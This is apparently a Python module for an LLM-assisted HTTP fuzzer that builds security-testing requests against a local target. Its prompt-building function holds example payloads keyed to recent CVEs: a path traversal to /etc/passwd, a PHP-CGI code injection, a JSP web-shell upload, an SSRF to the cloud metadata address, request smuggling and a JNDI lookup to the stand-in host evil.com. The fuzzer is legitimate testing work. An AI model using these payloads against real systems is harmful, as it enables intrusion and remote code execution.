"""
LLM Mutation Fuzzer (Unified Pool Architecture)

This fuzzer uses boofuzz for seed generation and LLM to update the mutation pool.

Architecture:
- seed: Uses boofuzz seed generation directly
- mutation_pool (10): Initialized by boofuzz, LLM updates every 10 iterations
"""

import json
import random
import copy
from typing import Dict, Any, Optional, List

from .base_fuzzer import BaseFuzzer, FuzzingPayload
from .boofuzz_baseline import BoofuzzSeedGenerator, BoofuzzMutator
from .llm_client import OllamaClient, FuzzingPrompts, extract_json_from_response


class LLMMutationFuzzer(BaseFuzzer):
    """
    Fuzzer that uses boofuzz for seeds and LLM to update mutation pool.

    Unified pool architecture:
    - Uses boofuzz seed generation directly
    - mutation_pool (10): Initialized by boofuzz, LLM updates every 10 iterations
    """

    # Attack types for LLM mutation generation (2024-2025 CVEs)
    ATTACK_TYPES = [
        "path_traversal",       # CVE-2024-53677 (Struts)
        "response_splitting",   # CVE-2024-24795
        "php_cgi_injection",    # CVE-2024-4577
        "jenkins_file_read",    # CVE-2024-23897
        "tomcat_partial_put",   # CVE-2025-24813
        "http2_continuation",   # CVE-2024-27316
        "ssrf",                 # CVE-2024-38476
        "null_pointer",         # CVE-2024-38477
        "smuggling",            # General
        "header_injection",     # General
    ]

    def __init__(
        self,
        target_host: str = "127.0.0.1",
        target_port: int = 8080,
        llm_base_url: str = "http://localhost:11434",
        llm_model: str = "qwen3:8b",
        llm_timeout: int = 60,
        llm_temperature: float = 0.8,
        pool_size: int = 10,
        refresh_interval: int = 10,
        **kwargs
    ):
        """
        Initialize the LLM mutation fuzzer.

        Args:
            target_host: Target server host
            target_port: Target server port
            llm_base_url: Ollama API base URL
            llm_model: Model name to use
            llm_timeout: LLM request timeout
            llm_temperature: Sampling temperature
            pool_size: Size of mutation pool (default: 10)
            refresh_interval: LLM updates pool every N iterations (default: 10)
        """
        super().__init__(target_host=target_host, target_port=target_port, **kwargs)

        # Initialize LLM client
        self.llm_client = OllamaClient(
            base_url=llm_base_url,
            model=llm_model,
            timeout=llm_timeout,
            temperature=llm_temperature
        )

        # Boofuzz components
        self.seed_generator = BoofuzzSeedGenerator(target_host, target_port)
        self.boofuzz_mutator = BoofuzzMutator()

        # Pool settings
        self.pool_size = pool_size
        self.refresh_interval = refresh_interval

        # Initialize mutation pool with boofuzz
        self._mutation_pool: List[Dict[str, Any]] = []
        self._iteration_counter = 0
        self._attack_index = 0

        # Metrics
        self._llm_updates = 0
        self._llm_successes = 0
        self._llm_failures = 0

        # Initialize pool with boofuzz
        self._init_mutation_pool_boofuzz()

        self.logger.info(
            f"Initialized LLMMutationFuzzer: model={llm_model}, "
            f"pool_size={pool_size}, refresh_interval={refresh_interval}"
        )

    @property
    def variant_name(self) -> str:
        return "llm_mutation"

    def _init_mutation_pool_boofuzz(self):
        """Initialize mutation pool with boofuzz-generated templates."""
        self._mutation_pool.clear()
        mutation_types = BoofuzzMutator.MUTATION_TYPES
        for i in range(self.pool_size):
            mutation_type = mutation_types[i % len(mutation_types)]
            self._mutation_pool.append(
                self.boofuzz_mutator.generate_mutation_template(mutation_type)
            )
        self.logger.debug(f"Initialized mutation pool with {len(self._mutation_pool)} boofuzz templates")

    def generate_seed(self) -> FuzzingPayload:
        """Generate a seed using boofuzz (same as baseline)."""
        self._iteration_counter += 1

        # Every N iterations, use LLM to update one mutation in pool
        if self._iteration_counter % self.refresh_interval == 0:
            self._llm_update_mutation_pool()

        return self.seed_generator.generate()

    def _llm_update_mutation_pool(self):
        """Use LLM to generate a new mutation template and replace one in pool."""
        self._llm_updates += 1

        # Generate new mutation template using LLM
        new_template = self._generate_llm_mutation_template()

        if new_template:
            # Replace a random template in pool
            replace_idx = random.randint(0, len(self._mutation_pool) - 1)
            self._mutation_pool[replace_idx] = new_template
            self._llm_successes += 1
            self.logger.debug(f"LLM updated mutation pool at index {replace_idx}")
        else:
            self._llm_failures += 1
            self.logger.debug("LLM mutation generation failed, pool unchanged")

    def _generate_llm_mutation_template(self) -> Optional[Dict[str, Any]]:
        """Generate a mutation template using LLM."""
        # Rotate through attack types
        attack_type = self.ATTACK_TYPES[self._attack_index % len(self.ATTACK_TYPES)]
        self._attack_index += 1

        prompt = self._build_mutation_prompt(attack_type)

        response = self.llm_client.generate(
            prompt=prompt,
            system_prompt="You are a security testing assistant. Generate HTTP mutation templates for fuzzing. Output JSON only.",
            temperature=0.8
        )

        if not response.success:
            self.logger.debug(f"LLM request failed: {response.error}")
            return None

        return self._parse_llm_mutation_response(response.content, attack_type)

    def _build_mutation_prompt(self, attack_type: str) -> str:
        """Build prompt for mutation template generation."""
        template_examples = {
            "path_traversal": {
                "type": "path_traversal",
                "path": "/..%252f..%252f..%252fetc/passwd",
            },
            "response_splitting": {
                "type": "response_splitting",
                "path_suffix": "%0d%0aSet-Cookie:%20evil=true",
            },
            "php_cgi_injection": {
                "type": "php_cgi",
                "method": "POST",
                "path": "/cgi-bin/php-cgi?%ADd+allow_url_include=1",
                "body": "<?php system('id'); ?>",
            },
            "jenkins_file_read": {
                "type": "jenkins_cli",
                "path": "/cli",
                "headers": {"X-Jenkins-CLI": "@/etc/passwd"},
                "body": "@/etc/passwd",
            },
            "tomcat_partial_put": {
                "type": "tomcat_put",
                "method": "PUT",
                "path": "/shell.jsp",
                "headers": {"Content-Range": "bytes 0-100/101"},
                "body": "<%Runtime.getRuntime().exec(\"id\");%>",
            },
            "http2_continuation": {
                "type": "http2_continuation",
                "headers": {"X-HTTP2-Continuation": "true"},
            },
            "ssrf": {
                "type": "ssrf",
                "path": "/proxy?url=http://169.254.169.254/",
                "headers": {"X-Forwarded-For": "127.0.0.1"},
            },
            "null_pointer": {
                "type": "null_pointer",
                "headers": {"Host": "", "Content-Length": "-1"},
            },
            "smuggling": {
                "type": "smuggling",
                "headers": {"Transfer-Encoding": "chunked", "Content-Length": "4"},
                "body": "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil\r\n\r\n",
            },
            "header_injection": {
                "type": "header_injection",
                "headers": {"X-Forwarded-For": "${jndi:ldap://evil.com/a}"},
            },
        }

        example = template_examples.get(attack_type, template_examples["path_traversal"])

        return f"""Generate ONE mutation template for {attack_type} attack.

A mutation template specifies how to modify an HTTP request for testing.
It can include: type, method, path, path_suffix, headers, body, extra_headers.

Example format:
{json.dumps(example, indent=2)}

Generate a DIFFERENT {attack_type} mutation template. Output JSON only:"""

    def _parse_llm_mutation_response(self, response: str, attack_type: str) -> Optional[Dict[str, Any]]:
        """Parse LLM response into mutation template."""
        try:
            data = extract_json_from_response(response, logger=self.logger)

            if data is None or not isinstance(data, dict):
                return None

            # Ensure type is set
            if "type" not in data:
                data["type"] = attack_type

            return data

        except Exception as e:
            self.logger.debug(f"Parse error: {e}")
            return None

    def mutate(self, payload: FuzzingPayload) -> FuzzingPayload:
        """
        Mutate using a template from the mutation pool.

        Uses round-robin selection from the pool.
        """
        if self._mutation_pool:
            idx = (self._iteration_counter - 1) % len(self._mutation_pool)
            template = self._mutation_pool[idx]
            return self.boofuzz_mutator.apply_mutation_template(payload, template)

        # Fallback to direct boofuzz mutation
        return self.boofuzz_mutator.mutate(payload)

    def get_stats(self) -> Dict[str, Any]:
        """Get fuzzer statistics."""
        stats = super().get_stats()
        stats.update({
            "mutation_pool_size": len(self._mutation_pool),
            "iteration_counter": self._iteration_counter,
            "llm_updates": self._llm_updates,
            "llm_successes": self._llm_successes,
            "llm_failures": self._llm_failures,
            "llm_stats": self.llm_client.get_stats()
        })
        return stats
